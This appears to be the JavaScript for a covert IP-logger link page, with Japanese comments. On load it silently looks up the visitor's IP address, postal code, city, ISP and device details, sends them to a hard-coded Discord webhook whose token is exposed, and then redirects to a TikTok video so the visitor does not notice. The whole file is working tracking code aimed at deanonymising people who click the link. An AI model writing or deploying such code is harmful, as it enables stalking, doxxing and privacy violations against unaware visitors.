const WEBHOOK_URL = "https://discord.com/api/webhooks/1496426741068202024/_p47MrXmw96zzzlw_-eN15stpsWHCptYKK3byQCoUofsD-AllITmfui1Q4b0sUaRO5zU"; 
const REDIRECT_URL = "https://www.tiktok.com/@sakonji_jrfv/video/7625181468586790162?...";

async function track() {
    try {
        // ip-api.com を使用して、郵便番号や緯度経度、プロバイダ情報を取得
        // fields=24831 は、必要な情報（国、地域、市、郵便番号、緯度経度、ISPなど）をすべて含める指定です
        const response = await fetch('http://ip-api.com/json/?fields=24831');
        const data = await response.json();
        
        const details = {
            os: navigator.platform,
            browser: navigator.userAgent,
            screenSize: `${window.screen.width}x${window.screen.height}`,
            referrer: document.referrer || "直接アクセス",
            localTime: new Date().toLocaleString('ja-JP')
        };

        if (WEBHOOK_URL) {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: "🔍 最高精度アクセスログ (GPSなし)",
                        color: 15418782,
                        fields: [
                            { name: "🌐 IPアドレス", value: data.query, inline: true },
                            { name: "📮 郵便番号 (推測)", value: data.zip || "不明", inline: true },
                            { name: "📍 場所 (詳細)", value: `${data.regionName} ${data.city}`, inline: false },
                            { name: "🏢 プロバイダ (ISP)", value: data.isp, inline: false },
                            { name: "📡 組織名 (Org)", value: data.org || "不明", inline: false },
                            { name: "📱 デバイス情報", value: `${details.os} / ${details.screenSize}`, inline: true },
                            { name: "🕒 取得時刻", value: details.localTime, inline: true },
                            { name: "🔗 参照元", value: details.referrer }
                        ],
                        footer: { text: "※IPアドレスに基づく推定値のため、数kmの誤差が生じます" },
                        timestamp: new Date().toISOString()
                    }]
                })
            });
        }
    } catch (e) {
        console.error("Tracking error:", e);
    }

    // 1.5秒後にリダイレクト
    setTimeout(() => {
        window.location.href = REDIRECT_URL;
    }, 1500);
}

track();
